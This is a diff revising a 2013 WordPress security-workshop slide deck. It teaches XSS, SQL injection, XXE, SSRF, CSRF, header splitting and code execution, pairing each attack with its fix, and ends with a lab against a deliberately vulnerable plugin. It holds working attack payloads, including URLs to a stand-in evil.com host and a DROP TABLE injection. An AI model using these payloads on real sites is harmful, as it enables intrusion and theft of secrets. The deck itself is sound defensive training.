@@ -11,7 +11,7 @@ VIP Developer Workshop 2013 - Napa, CA - mdawaffe
 
 <h2>mdawaffe = Mike Adams</h2>
 <ul>
-	<li><span style="line-height: 14px;">Automattic for ~7 years</span></li>
+	<li>Automattic for ~7 years</li>
 	<li>WordPress Developer ~9 years</li>
 	<li>Currently work on Team Data</li>
 </ul>
@@ -20,15 +20,17 @@ VIP Developer Workshop 2013 - Napa, CA - mdawaffe
 
 <h2>Security is a Process</h2>
 <ul>
-	<li><span style="line-height: 14px;">Not a feature</span></li>
+	<li>Not a feature</li>
 	<li>Not an afterthought</li>
-	<li>Learn to think like an attacker</li>
 </ul>
+
+Learn to think like an attacker.
 
 <!--nextpage-->
 
-<h2>So we're not going to fix anything</h2>
-We're only going to try and <em>break stuff</em> :)
+<h2>Hands On: We're Not Going to Fix Anything</h2>
+
+We're only going to <strong>break stuff</strong> :)
 
 <!--nextpage-->
 
@@ -49,10 +51,10 @@ Unescaped data tricks the service into betraying itself.
 
 Each data format or protocol needs its own methods of sanitizing data.
 
-Context is king:
+<h3>Context Is King</h3>
 <ul>
-	<li>Don't sanitize SQL queries with <code>wp_specialchars()</code>.</li>
-	<li>Don't sanitize URLs with <code>$wpdb->escape()</code>.</li>
+	<li>Apps shouldn't sanitize SQL queries with <code>wp_specialchars()</code>.</li>
+	<li>Apps shouldn't sanitize URLs with <code>$wpdb->escape()</code>.</li>
 	<li>...</li>
 </ul>
 
@@ -60,11 +62,11 @@ Context is king:
 
 <h2>XSS</h2>
 
-<h3>Attacker's Goal</h2>
+<h3>Our Goal as the Attacker</h2>
 
-Inject JavaScript into your site's HTML.
+Inject JavaScript into the site's HTML.
 
-Once they can do that, they can act as you.
+Once we can do that, we can act as a privileged user.
 
 <h3>Example: HTML</h3>
 
@@ -90,7 +92,7 @@ http://example.com/?ref=
 >Hello</a>
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
 [code lang="php"]
 ?>
 <a href="<?php
@@ -104,8 +106,9 @@ http://example.com/?ref=
 <ul>
 	<li><code>esc_html()</code>, <code>esc_attr()</code>, <code>esc_url()</code></li>
 	<li><code>esc_js()</code>, <code>json_encode()</code></li>
-	<li>Aside: you can break XML output if it's not run through <code>ent2ncr()</code> first.</li>
 </ul>
+
+Aside: apps can accidentally break XML output if the output is not first run through <code>ent2ncr()</code>.
 
 <!--nextpage-->
 
@@ -149,14 +152,14 @@ val html = '<a
 >Click me for fun!</a>';
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
 <ul>
 	<li>
 		Building HTML from strings is just like PHP:
-		You have to escape everything.
+		Apps must escape everything.
 	</li>
-	<li>Difference between jQuery's <code>.html()</code> and <code>.text()</code>.</li>
-	<li>Use jQuery's <code>.attr()</code>, <code>.val()</code>, <code>.data()</code>.</li>
+	<li>jQuery's <code>.html()</code> and <code>.text()</code> are not the same.</li>
+	<li>Apps should use jQuery's <code>.attr()</code>, <code>.val()</code>, <code>.data()</code>.</li>
 </ul>
 
 <!--nextpage-->
@@ -167,19 +170,19 @@ val html = '<a
 
 The way data is transfered between Flash and JS is very hard to secure correctly.
 
-<h3>Solution</h3>
+<h3>No Flash = No Flash Vulnerability</h3>
 
-Don't use flash.
+Apps shouldn't use flash.
 
-If you have to, host it on a cookieless domain.
+If they must, flash should be hosted on a cookieless domain.
 
 <!--nextpage-->
 
 <h2>SQL Injection</h2>
 
-<h3>Attacker's Goal</h3>
+<h3>Our Goal as the Attacker</h3>
 
-Read from or write to your site's database in a way you don't intend.
+Read from or write to the site's database in a way it doesn't intend.
 
 <h3>Example</h3>
 [code lang=php]
@@ -205,7 +208,7 @@ SELECT *
 DROP TABLE `users`;#'Comment'
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
 [code lang=php]
 $data = json_decode( $HTTP_RAW_POST_DATA );
 $user = $wpdb->get_row( $wpdb->prepare(
@@ -223,9 +226,11 @@ $user = $wpdb->get_row( $wpdb->prepare(
 
 <h2>Header Splitting</h2>
 
-<h3>Attacker's Goal</h3>
+<h3>Our Goal as the Attacker</h3>
 
-Header manipulation can lead to all sorts of crazy behavior including XSS.
+Header manipulation can lead to all sorts of crazy behavior (including XSS).
+
+Let's just log people out.
 
 <h3>Example</h3>
 [code lang=php]
@@ -247,17 +252,24 @@ Set-Cookie: wordpress_logged_in_123=
 ...
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
+[code lang=php]
+wp_redirect( $_GET['redirect'] );
+[/code]
+
 <ul>
-	<li>Mitigated only as of PHP 5.3.11/5.4.0!</li>
-	<li>Use <code>wp_redirect()</code></li>
+	<li>
+		This issue with <code>header()</code> was mitigated only as of
+		PHP 5.3.11/5.4.0 = April, 2012.
+	</li>
+	<li>Apps should use <code>wp_redirect()</code>.</li>
 </ul>
 
 <!--nextpage-->
 
 <h2>Code Execution</h2>
 
-<h3>Attacker's Goal</h3>
+<h3>Our Goal as the Attacker</h3>
 
 Obvious :)
 
@@ -270,9 +282,9 @@ eval( $_GET['calculator'] );
 
 Obvious :)
 
-<h3>Solution</h3>
+<h3>No <code>eval()</code> = No <code>eval()</code> Vulnerability</h3>
 
-Don't use <code>eval()</code>.
+Apps shouldn't use <code>eval()</code>.
 
 <!--nextpage-->
 
@@ -300,9 +312,18 @@ $something = eval( $_GET['php_code'] );
 $content = "<h1>" . strtoupper( $$something ) . "</h1>";
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
+[code lang=php]
+$content = preg_replace_callback(
+  '!<h1>(.*?)</h1>!e',
+  function( $matches ) {
+    return '<h1>' . strtoupper( $matches[1] ) . '</h1>';
+  },
+  $content
+);
+[/code]
 
-Use <code>preg_replace_callback()</code> instead.
+Apps should use <code>preg_replace_callback()</code> instead of <code>preg_replace( '//e' )</code>
 
 <!--nextpage-->
 
@@ -335,7 +356,7 @@ http://localhost/naive-search-replace.php
 5.3.6
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
 [code lang=php]
 $pattern = preg_quote( $_GET['pattern'], '#' );
 $replace = $_GET['replace'];
@@ -346,7 +367,7 @@ echo preg_replace(
 );
 [/code]
 
-Always use <code>preg_quote()</code>.
+Apps must always use <code>preg_quote()</code>.
 
 <!--nextpage-->
 
@@ -375,7 +396,7 @@ http://localhost/image-cache.php
   ?file=http://evil.com/dangerous.php%00ignored.gif
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
 [code lang=php]
 ...
 $image_name = sanitize_file_name(
@@ -385,10 +406,11 @@ $image_name = sanitize_file_name(
 [/code]
 
 <ul>
-	<li>Use <code>sanitize_file_name()</code>.</li>
+	<li>Apps should use <code>sanitize_file_name()</code>.</li>
 	<li>
-		As always, keep WordPress up to date :)
-		Core fix for sanitize_file_name: <a href="http://core.trac.wordpress.org/changeset/12072">[12072]</a>
+		As always, site owners must keep WordPress up to date :)
+		Core fix for <code>sanitize_file_name()</code>:
+		<a href="http://core.trac.wordpress.org/changeset/12072">[12072]</a> = WP 2.8.5 = October, 2009
 	</li>
 </ul>
 
@@ -405,13 +427,13 @@ $image_name = sanitize_file_name(
 	<li><code>``</code> (backticks)</li>
 </ul>
 
-<h3>Attacker's Goal</h3>
+<h3>Our Goal as the Attacker</h3>
 
 Pwn.
 
-<h3>Solution</h3>
+<h3>No System Calls =<br />No System Execution Vulnerabilities </h3>
 <ul>
-	<li>Don't use them :)</li>
+	<li>These function are dangerous.  Apps shouldn't use them.</li>
 	<li><code>escapeshellarg()</code> (but watch out for <code>"-"</code>!)</li>
 </ul>
 
@@ -419,13 +441,13 @@ Pwn.
 
 <h2>XXE: XML eXternal Entity Injection</h2>
 
-XML is awesome. It lets you define additional <code>&amp;entities;</code>.
+XML is awesome. It lets the document author define additional <code>&amp;entities;</code>.
 
-XML is extra awesome. It lets you reference external resources in those definitions.
+XML is extra awesome. It lets the document author reference <strong>external resources</strong> in those definitions.
 
-PHP is super awesome. By default, it will fetch and use any external entity you throw at it.
+PHP is super awesome. By default, it will fetch and use <strong>any external entity</strong> document authors throw at it.
 
-<h3>Attacker's Goal</h3>
+<h3>Our Goal as the Attacker</h3>
 
 <ul>
 	<li>Intranet access</li>
@@ -473,7 +495,7 @@ define('NONCE_SALT',       'UqtXSfr@...');
 ... Uploaded!</h1>
 [/code]
 
-<h3>Solution</h3>
+<h3>This Would Have Stopped Us</h3>
 [code lang=php]
 <?php
 libxml_disable_entity_loader( true );
@@ -503,7 +525,7 @@ Anything that uses libxml.
 
 Every PHP app ever that manipulates XML has been hit by vulnerabilities of this type.
 
-Including PHP itself: <a href="http://www.cvedetails.com/cve/CVE-2013-1643/">CVE-2013-1643</a> (5.4.13 = March 2013).
+Including PHP itself: <a href="http://www.cvedetails.com/cve/CVE-2013-1643/">CVE-2013-1643</a> (5.3.23/5.4.13 = <strong>March, 2013</strong>).
 
 <!--nextpage-->
 
@@ -513,9 +535,9 @@ All I/O must be handled correctly.
 
 Mail headers, TCP packets, SOAP requests, LDAP, JSON, Regex, ... anything with input/output.
 
-Context is king.  Each data format or protocol needs its own methods of sanitizing data.
+<strong>Context is king</strong>.  Each data format or protocol needs its own methods of sanitizing data.
 
-<h3>Tips</h3>
+<h3>Tips for Developers</h3>
 
 <ul>
 	<li>Validate input immediately.</li>
@@ -552,5 +574,440 @@ echo esc_html( $name ); # is this safe? Yes.
 
 <h2>Attacks of Intent: Summary</h2>
 
-Trick a user into doing something they don't want to.
+We want to trick a user into doing something they don't want to.
 
+In addition to verifying the user is logged in and capable of an action, the app needs to make sure the user <strong>intended</strong> to perform that action.
+
+<!--nextpage-->
+
+<h2>CSRF: Cross Site Request Forgery</h2>
+
+<h3>Our Goal as the Attacker</h3>
+
+Without a user knowing, trick them into performing some action the we can't do ourselves.
+
+<strong>Note to Developers</strong>: CSRF mitigation is <strong>useless</strong> if there is an XSS vulnerability.
+
+<h3>Example</h3>
+[code lang=php]
+if ( '/account/delete' === $_SERVER['REQUEST_URI'] ) {
+    delete_account( current_user_id() );
+}
+[/code]
+
+<h3>Attack</h3>
+[code lang=html]
+<h1>Look at this cool picture!</h1>
+<img src="http://example.com/account/delete" />
+[/code]
+
+<h3>Result</h3>
+The victim's browser makes a request to that "image" URL and happily sends the victim's example.com cookies along with it.
+
+<h3>This Would Have Stopped Us</h3>
+[code lang=php]
+if ( '/account/delete' === $_SERVER['REQUEST_URI'] ) {
+    // Ensures the user followed a link
+    // that had been protected with wp_nonce_url()
+    check_admin_referer();
+
+    delete_account( current_user_id() );
+}
+[/code]
+
+Request made != Request intended.
+
+Actions that require permissions must be protected with some secret unknown to the attacker and that will not be automatically sent by the browser.
+
+<ul>
+	<li><code>wp_nonce_url()</code>, <code>wp_nonce_field()</code>, (<code>wp_create_nonce()</code>)</li>
+	<li><code>check_admin_referer()</code>, <code>check_ajax_referer()</code> (both badly named), (<code>wp_verify_nonce()</code>)</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>Clickjacking</h2>
+
+Our malicious site:
+<ul>
+	<li>Frames the victim's site in an iframe, and</li>
+	<li>Tricks visitors into interacting with one site when they think they are interacting with the other.</li>
+</ul>
+
+To do this, the our malicious site employs some form of UI trickery.
+<ul>
+	<li>Overlaying the victim's site transparently over our malicious site.</li>
+	<li>Masking all but some piece of the victim's (now generic looking) UI under our malicious site.</li>
+	<li>Using a custom CSS mouse cursor to make the visitor think they are clicking one place, when really they are clicking somewhere else.</li>
+</ul>
+
+<h3>This Would Have Stopped Us</h3>
+<ul>
+	<li><code>X-FRAME-OPTIONS</code> header.</li>
+	<li>Framebusting script for older browsers.</li>
+</ul>
+
+[code lang=php]
+header( 'X-FRAME-OPTIONS: SAMEORIGIN' );
+[/code]
+
+[code lang=html]
+<html class="inframe">
+<head>
+<title>Don't frame me, bro!</title>
+<style>
+.inframe {
+  display: none;
+}
+</style>
+<script type="text/javascript">
+if ( self === top ) {
+  document.documentElement.className =
+    document.documentElement.className.
+    replace( 'inframe', '' );
+} else {
+  top.location = self.location;
+}
+</script>
+</head>
+[/code]
+
+Why the CSS trick?
+
+[code lang=html]
+<iframe sandbox> <!-- HTML5 -->
+<iframe security="restricted"> <!-- IE -->
+[/code]
+
+<!--nextpage-->
+
+<h2>Cross Iframe Communication</h2>
+
+Old techniques of communicating between iframes are insecure.
+<ul>
+	<li>Updating URL <code>#fragments</code></li>
+	<li><code>window.name</code></li>
+	<li>etc.</li>
+</ul>
+
+If we see this kind of communication, there may be some spoofing or MITM attack we can perform.
+
+<h3>This Would Have Stopped Us</h3>
+
+<code>window.postMessage( message, origin )</code>
+
+As long as it's used securely... :)
+
+<h3>Tips for Developers</h3>
+<ul>
+	<li>Always set (and check) <code>origin</code>s when using <code>window.postMessage()</code>.</li>
+	<li>Never use <code>'*'</code> as the <code>origin</code>.</li>
+	<li>Never use user input as the <code>origin</code>.</li>
+</ul>
+
+<!--nextpage-->
+
+<h2>SSRF: Server Side Request Forgery</h2>
+
+<h3>Our Goal as the Attacker</h3>
+
+Trick the victim's server into making a request that only it can make.
+
+This is basically CSRF on the backend.
+
+<h3>Example: Is Image?</h3>
+[code lang=php]
+$url = filter_var( $_POST['url'], FILTER_VALIDATE_URL );
+$is_image = false;
+
+if ( $url ) {
+  $image = wp_remote_get( $url );
+  $is_image = preg_match(
+    '/image/',
+    wp_remote_retrieve_header( $image, 'content-type' )
+  );
+}
+
+if ( $is_image ) {
+  die( 'YAY! IMAGE!' );
+} else {
+  die( 'BOO :( AM SAD' );
+}
+[/code]
+
+<h3>Attack</h3>
+
+Suppose the victim's server hosts or otherwise has access to some internal service.
+
+[code lang=no-highlight]
+url=http://
+  the-ceo:12345
+  @directory.intranet/users/the-president/
+  ?_method=DELETE
+[/code]
+
+Not so <code>wp_<strong style="color: red;">remote</strong>_get()</code> now, are you?
+
+<h3>This Would Have Stopped Us</h3>
+
+Apps must make sure the URL's protocol, host, port, etc. all makes sense.
+
+<h3>Tip for Developers</h3>
+
+See core's <a href="http://core.trac.wordpress.org/browser/tags/3.5.1/wp-includes/comment.php#L1954"><code>pingback_ping_source_uri()</code></a> as an example.
+
+Note: The previous <a href="../18/">XXE Example</a> incorporates another SSRF attack example.
+
+<!--nextpage-->
+
+<h2>Open Redirects</h2>
+
+Definition: Resources on a server that will redirect to any <strong>external</strong> resource.
+
+<h3>Example</h3>
+
+[code lang=no-highlight]
+http://www.gravatar.com/avatar/
+  00000000000000000000000000000000?d={url}
+[/code]
+
+[code lang=php]
+if ( ! hash_exists( $hash ) ) {
+  wp_redirect( $_GET['d'] );
+  exit;
+}
+[/code]
+
+<h3>Attack: Phishing</h3>
+[code lang=html]
+<p>
+  You trust <a
+    href="http://www.gravatar.com/avatar/0
+      ?d=http://evil.com/"
+  >Gravatar</a>, right?
+</p>
+[/code]
+
+<h3>Attack: OAuth</h3>
+
+If an OAuth client has an open redirect, and the OAuth service is flexible enough with their redirect URLs, we can steal credentials :)
+
+<h3>This Would Have Stopped Us</h3>
+[code lang=php]
+if ( ! hash_exists( $hash ) ) {
+  wp_safe_redirect( $_GET['d'] );
+  exit;
+}
+[/code]
+
+Apps must only redirect to trusted URLs.
+<ul>
+	<li><code>wp_safe_redirect()</code></li>
+	<li>Protect redirects with nonces or some other CSRF mitigation.</li>
+</ul>
+
+Note: Gravatar now serves external images directly, rather than redirecting to arbitrary URLs.
+
+<!--nextpage-->
+
+<h2>Attacks of Intent: Conclusion</h2>
+
+Food for Developers' thoughts:
+<ul>
+	<li>Confidentiality: Does it matter who sees your data?</li>
+	<li>Authentication: Do you need to know who sent the data you get? Do you need to know who receive the data you send?</li>
+	<li>What would happen if someone tried to forge the request/input?</li>
+	<li>What would happen if someone sent the requests you expect, but in the wrong order?</li>
+</ul>
+
+Apps must not allow requests to be spoofed: verify intent with secrets unavailable to the outside.
+
+<!--nextpage-->
+
+<h2>Gotchas</h2>
+
+Cute bugs caused by bad code.
+
+<h3>Permissions: <code>current_user_can()</code> &gt; <code>is_user_logged_in()</code></h3>
+Apps must verify the user has permission to view, create, edit, etc.
+
+<h3>Strict Equality Checking</h3>
+<ul>
+	<li><code>===</code></li>
+	<li><code>in_array( $needle, $haystack, true )</code></li>
+</ul>
+[code lang=php]
+10 == '10ab7c4f2e' # true
+ 0 == 'a75be5c82d' # true
+[/code]
+
+This is especially important when apps verify passwords, keys, hashes, etc.
+
+<a href="http://php.net/manual/en/types.comparisons.php">PHP Type Comparisons</a>.
+
+<h3>The App's MySQL Collation is Probably Case Insensitive</h3>
+[code lang=sql]
+SELECT `id`, `secret`
+  FROM `user_secrets`
+  WHERE `secret` = 'abc123';
+--> 1, AbC123
+[/code]
+
+<h4>This Would Have Stopped Us</h4>
+[code lang=sql]
+SELECT `id`, `secret`
+  FROM `user_secrets`
+  WHERE `secret` = BINARY 'abc123';
+--> 7, abc123
+[/code]
+
+<h3>Signatures: <code>hash_hmac()</code> &gt; <code>md5()</code></h3>
+[code lang=php]
+$hash = md5( $key . $data ); # Boo
+$hash = hash_hmac( 'md5', $data, $key ); # Yay!
+[/code]
+
+<a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>.
+
+<h3>JS Sanitation Is Important</h3>
+
+We don't need quotes to do anything in JavaScript.
+
+[code lang=js]
+/foo/.substr(1, 3); // "foo"
+[/code]
+
+In fact, we only need the following six characters :)
+
+<code>()[]!+</code>
+
+<a href="http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html">http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html</a>
+
+<h3>SSL Host Verification Off by Default :(</h3>
+[code lang=php]
+file_get_contents( 'https://example.com/' ); // :(
+[/code]
+
+<h4>This Would Have Stopped Us</h4>
+[code lang=php]
+$curl = curl_init( 'https://example.com/' );
+curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
+curl_exec( $curl );
+[/code]
+
+Apps should always use cURL. (Or <code>wp_remote_*()</code>.)
+
+<h3><code>wp_redirect()</code> Doesn't Exit</h3>
+[code lang=php]
+<?php
+require 'wp-load.php';
+if (
+  empty( $_GET['token'] )
+||
+  'some-token' !== $_GET['token']
+)
+  wp_safe_redirect( 'Location: /' );
+
+readfile( __FILE__ );
+
+exit();
+[/code]
+
+<h4>Attack</h4>
+
+[code lang=bash]
+$ curl -v http://192.168.1.40/trunk/demo.php
+* About to connect() to 192.168.1.40 port 80 (#0)
+*   Trying 192.168.1.40... connected
+> GET /trunk/demo.php HTTP/1.1
+> User-Agent: curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
+> Host: 192.168.1.40
+> Accept: */*
+> 
+< HTTP/1.1 302 Found
+< Date: Fri, 12 Apr 2013 13:50:58 GMT
+< Server: Apache/2.2.22 (Ubuntu)
+< X-Powered-By: PHP/5.4.13-2~precise+1
+< Location: http://192.168.1.35/trunk/wp-admin/
+< Vary: Accept-Encoding
+< Content-Length: 164
+< Content-Type: text/html
+< 
+<?php
+require 'wp-load.php';
+if (
+  empty( $_GET['token'] )
+||
+  'some-token' !== $_GET['token']
+)
+  wp_safe_redirect( 'Location: /' );
+
+readfile( __FILE__ );
+
+exit();
+* Connection #0 to host 192.168.1.40 left intact
+* Closing connection #0
+[/code]
+
+<h4>This Would Have Stopped Us</h4>
+[code lang=php]
+if (
+  empty( $_GET['token'] )
+||
+  'some-token' !== $_GET['token']
+) {
+  wp_safe_redirect( 'Location: /' );
+  exit();
+}
+[/code]
+
+<!--nextpage-->
+
+<h2>Links for Developers</h2>
+
+<h3>Survive The Deep End: PHP Security</h3>
+<a href="http://phpsecurity.readthedocs.org/">http://phpsecurity.readthedocs.org/</a>
+
+<h3>OWASP: The Open Web Application Security Project</h3>
+<a href="http://owasp.com/">http://owasp.com/</a>
+
+<!--nextpage-->
+
+<h2>Time to Become a H4x0R</h2>
+
+There is a chat widget enabled in the sidebar of this blog.
+
+The code is at wp-content/plugins/Chat-Sploit/
+
+Feel free to read it.
+
+<h3>Your Goal as the Attacker</h3>
+While logged in as the user "author" (password: "author"),
+<ul>
+	<li>Make the "admin" user say something,</li>
+	<li>Git a list of all user's email addresses,</li>
+	<li>Get the site's <code>SECRET_KEY</code>s ...,</li>
+	<li>... and <code>SECRET_SALT</code>s.</li>
+</ul>
+
+Note: That's a <code>&lt;ul&gt;</code>.  Do these attacks in whatever order you like.
+
+<!--nextpage-->
+
+<h2>Time to Become a 1337 H4x0R</h2>
+
+Log in as "admin" (password: "admin") and activate the Member's Only plugin.
+
+(The default settings should be fine.)
+
+Now, <strong>log out entirely</strong>.
+
+While logged out, do everything again :)
+<ul>
+	<li>Make the "admin" user say something,</li>
+	<li>Git a list of all user's email addresses,</li>
+	<li>Get the site's <code>SECRET_KEY</code>s ...,</li>
+	<li>... and <code>SECRET_SALT</code>s.</li>
+</ul>
+
+Again, in whatever order you like.
